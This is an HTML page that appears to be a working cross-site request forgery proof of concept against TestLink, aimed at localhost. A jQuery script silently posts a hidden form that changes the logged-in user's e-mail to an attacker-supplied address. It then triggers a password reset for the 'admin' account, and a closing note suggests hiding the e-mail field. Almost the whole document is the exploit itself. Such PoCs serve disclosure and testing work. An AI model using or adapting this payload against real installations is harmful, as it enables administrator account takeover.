<html>
<head>
<script type='text/javascript'>

var hackIt = function() {
	console.log('Initializing the attack...');

	var form = jQuery('form#change_passwd');
	jQuery.post(form.attr('action'), form.serialize());
	//console.log('' + form.attr('action'));
	
	jQuery('form#get_passwd').submit();
	console.log('Done!');
	
};
</script>
</head>
<body>
<h1>Attention! This changes your logged in user e-mail, and resets your password!</h1>
<form id='change_passwd' action='http://localhost/testlink/lib/usermanagement/userInfo.php' method='post'>
	<input type='hidden' name='doAction' value='editUser' />
	<input type='hidden' name='firstName' value='You have been' />
	<input type='hidden' name='lastName' value='Hacked' />
	<label>Enter the new admin e-mail</label>
	<input type='text' name='emailAddress' value='' />
	<input type='hidden' name='locale' value='en_GB' />
</form>

<form id='get_passwd' action='http://localhost/testlink/lostPassword.php' method='post'>
	<input type='hidden' name='login' value='admin' />
</form>

<button onclick='hackIt();'>Submit!</button>
<hr/> 
<p><em>Note: Here the new admin e-mail is a input text field. But you could let it hidden with a pre-defined new e-mail.</em></p>
<script type='text/javascript' src='jquery.js'></script>
</body>
</html>